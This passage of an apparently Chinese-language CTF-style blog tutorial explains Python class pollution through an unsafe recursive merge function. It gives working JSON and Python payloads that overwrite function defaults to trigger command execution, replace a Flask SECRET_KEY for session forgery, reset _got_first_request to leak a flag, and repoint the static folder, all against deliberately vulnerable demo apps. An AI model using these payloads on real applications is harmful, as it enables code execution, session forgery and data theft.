+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evil_func</span>(<span class="params">arg_1, shell=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;evil_func&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span>: (</span><br><span class="line">                    <span class="literal">True</span>,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evil_func(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evil_func(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># laptop-hgndqc28\koishi</span></span><br></pre></td></tr></table></figure></div>
+
+<p>注意这里 <code>__defaults__</code> 设置的值后还有个，不然无法转化为元组数据类型。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;__defaults__&quot;: (</span><br><span class="line">                    True,</span><br><span class="line">                )</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h4 id="kwdefaults"><a href="#kwdefaults" class="headerlink" title="__kwdefaults__"></a><code>__kwdefaults__</code></h4><p><code>__kwdefaults__</code>以字典的形式按从左到右的顺序收录了函数<strong>键值形参（关键字形参）</strong>的默认值，从代码上来看，则是如下的效果：</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2=<span class="number">2</span>, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2=<span class="number">2</span>, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2=<span class="number">2</span>, *, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2=<span class="number">2</span>, *, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__kwdefaults__)</span><br><span class="line"><span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__kwdefaults__)</span><br><span class="line"><span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__kwdefaults__)</span><br><span class="line"><span class="comment"># &#123;&#x27;var_3&#x27;: 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__kwdefaults__)</span><br><span class="line"><span class="comment"># &#123;&#x27;var_3&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>通过替换该属性便能实现对函数键值形参的默认值替换</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1, *, shell=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span>: <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># laptop-hgndqc28\koishi</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="特定值替换"><a href="#特定值替换" class="headerlink" title="特定值替换"></a>特定值替换</h3><h4 id="os-environ赋值"><a href="#os-environ赋值" class="headerlink" title="os.environ赋值"></a><code>os.environ</code>赋值</h4><p>可以实现多种利用方式，如<code>NCTF2022</code>中<code>calc</code>考点对<code>os.system</code>的利用，结合<code>LD_PRELOAD</code>与文件上传<code>.so</code>实现劫持等</p>
+<p>&#x2F;&#x2F; todo</p>
+<h4 id="flask相关特定属性"><a href="#flask相关特定属性" class="headerlink" title="flask相关特定属性"></a><code>flask</code>相关特定属性</h4><h5 id="SECRET-KEY"><a href="#SECRET-KEY" class="headerlink" title="SECRET_KEY"></a><code>SECRET_KEY</code></h5><p>决定<code>flask</code>的<code>session</code>生成的重要参数，知道该参数可以实现<code>session</code>任意伪造</p>
+<p>给出示范环境如下：</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;koishi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;[+]Config:%s&quot;</span> % (app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>正常访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111195117344.png"
+                      alt="image-20240111195117344"
+                ></p>
+<p>使用如下的<code>Payload</code>：</p>
+<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;config&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;SECRET_KEY&quot;</span> <span class="punctuation">:</span><span class="string">&quot;shruti&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111195247022.png"
+                      alt="image-20240111195247022"
+                ></p>
+<p>修改为GET再次请求也仍然被换成了 shruti </p>
+<h5 id="got-first-request"><a href="#got-first-request" class="headerlink" title="_got_first_request"></a><code>_got_first_request</code></h5><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，依据源码可以知道<code>_got_first_request</code>值为假时才会调用：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127104851348-904331972.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127104901229-2020805748.png"
+                      alt="img"
+                ></p>
+<p><strong>给出示范环境如下：</strong></p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Where is Flag?&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app, <span class="string">&quot;special&quot;</span>) <span class="keyword">and</span> app.special == <span class="string">&quot;U_Polluted_It&quot;</span>:</span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="built_in">setattr</span>(app, <span class="string">&quot;special&quot;</span>, <span class="string">&quot;U_Polluted_It&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>flag</strong>文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">koishi&#123;congratulation&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>before_first_request</code>修饰的<code>init</code>函数只会在第一次访问前被调用，而其中读取<code>flag</code>的逻辑又需要访问路由<code>/</code>后才能触发，这就构成了矛盾。所以需要使用<code>payload</code>在访问<code>/</code>后重置<code>_got_first_request</code>属性值为假，这样<code>before_first_request</code>才会再次调用。</p>
+<p>携带<code>Payload</code>重置<code>_got_first_request</code>属性值为假</p>
+<h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;_got_first_request&quot;</span> <span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>init</code>函数被触发，且其中读取<code>flag</code>的相关逻辑被执行，这样就获得了<code>flag</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111204529612.png"
+                      alt="image-20240111204529612"
+                ></p>
+<h5 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path"></a><code>_static_url_path</code></h5><p>这个属性中存放的是<code>flask</code>中静态目录的值，默认该值为<code>static</code>。访问<code>flask</code>下的资源可以采用如<code>http://domain/static/xxx</code>，这样实际上就相当于访问<code>_static_url_path</code>目录下<code>xxx</code>的文件并将该文件内容作为响应内容返回。除此以外还有个值，static_folder，这个值是表示后端存放文件的位置。</p>
+<p>区别：</p>
+<ul>
+<li><p><strong>static_url_path：</strong></p>
+<p>前端访问资源文件的前缀目录，也就是规定了前端如何访问文件，默认是<code>/static</code>，就是前端必须这样访问：<code>&lt;img src=&quot;/static/img/mylogo.jpg&quot; /&gt;</code>我们改成 <code>&#39;&#39;</code>，就可以这样访问了：<code>&lt;img src=&quot;/img/mylogo.jpg&quot; /&gt;</code></p>
+</li>
+<li><p><strong>static_folder:</strong></p>
+<p>后端存储资源文件的目录。这个也就是我们实际存放文件的位置，所以我们要污染应该是污染这个值</p>
+</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--static/hello.html--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/hello.html&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>flag 文件</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">koishi&#123;congratulation&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>此时<code>http://domain/static/xxx</code>只能访问到文件系统当前目录下<code>static</code>目录中的<code>xxx</code>文件，并且不存在如目录穿越的漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111205332589.png"
+                      alt="image-20240111205332589"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111205403186.png"
+                      alt="image-20240111205403186"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111205428286.png"
+                      alt="image-20240111205428286"
+                ></p>
+<p>污染该属性为当前目录。这样就能访问到当前目录下的<code>flag</code>文件了</p>
